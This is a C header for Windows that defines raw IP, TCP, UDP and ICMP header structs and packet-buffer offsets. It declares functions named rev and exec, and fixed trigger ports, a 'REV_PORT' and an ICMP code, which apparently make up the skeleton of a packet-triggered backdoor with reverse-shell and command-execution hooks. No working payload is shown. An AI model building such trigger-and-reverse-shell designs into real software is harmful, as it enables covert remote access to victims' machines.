#pragma once

#ifdef DEBUG
#include <errno.h>
#include <stdio.h>
#endif
#include <stdint.h>
#include <winsock2.h>
#include <mstcpip.h>

#pragma comment(lib, "ws2_32.lib")


struct sockaddr_in* GetIP();
void rev(char*);
void exec(char*);


struct icmp_hdr_s {
	uint8_t type;
	uint8_t code;
	uint16_t checksum;
	uint16_t id;
	uint16_t seq;
};

struct udp_hdr_s {
	uint16_t	source;
	uint16_t	dest;
	uint16_t	len;
	uint16_t	check;
};

struct tcp_hdr_s {
	uint16_t 	th_sport;
	uint16_t 	th_dport;
	uint32_t 	th_seq;
	uint32_t	th_ack;
	uint8_t 	th_x2 : 4, th_off : 4;
	uint8_t 	th_flags;
	uint16_t 	th_win;
	uint16_t 	th_sum;
	uint16_t 	th_urp;
};


struct ip_hdr_s {
	uint8_t  	ip_hl : 4, ip_v : 4;
	uint8_t   	ip_tos;
	uint16_t    ip_len;
	uint16_t    ip_id;
	uint16_t    ip_off;
	uint8_t     ip_ttl;
	uint8_t     ip_p;
	uint16_t    ip_sum;
	uint32_t 	ip_src;
	uint32_t 	ip_dst;
};


#define BUFFER_SIZE_PKT ((256*256) - 1)
#define BUFFER_SIZE_ETH 14
#define BUFFER_SIZE_IP (BUFFER_SIZE_PKT - BUFFER_SIZE_ETH)
#define BUFFER_SIZE_TCP sizeof(struct tcp_hdr_s)
#define BUFFER_SIZE_UDP sizeof(struct udp_hdr_s)
#define BUFFER_SIZE_ICMP sizeof(struct icmp_hdr_s)

#define BUFFER_OFFSET_ETH 16
#define BUFFER_OFFSET_IP (BUFFER_OFFSET_ETH + BUFFER_SIZE_ETH)
#define BUFFER_OFFSET_L4 ( BUFFER_OFFSET_IP + sizeof(struct ip_hdr_s) )
#define BUFFER_OFFSET_TCP_DATA ( BUFFER_OFFSET_L4 + sizeof(struct tcp_hdr_s) )
#define BUFFER_OFFSET_UDP_DATA ( BUFFER_OFFSET_L4 + sizeof(struct udp_hdr_s) )
#define BUFFER_OFFSET_ICMP_DATA ( BUFFER_OFFSET_L4 + sizeof(struct icmp_hdr_s) )

#define SRC_PORT 	6006
#define SRC_PORT_2	8557 
#define REV_PORT 	2628

#define ICMP_REQ 	8
#define ICMP_CODE	1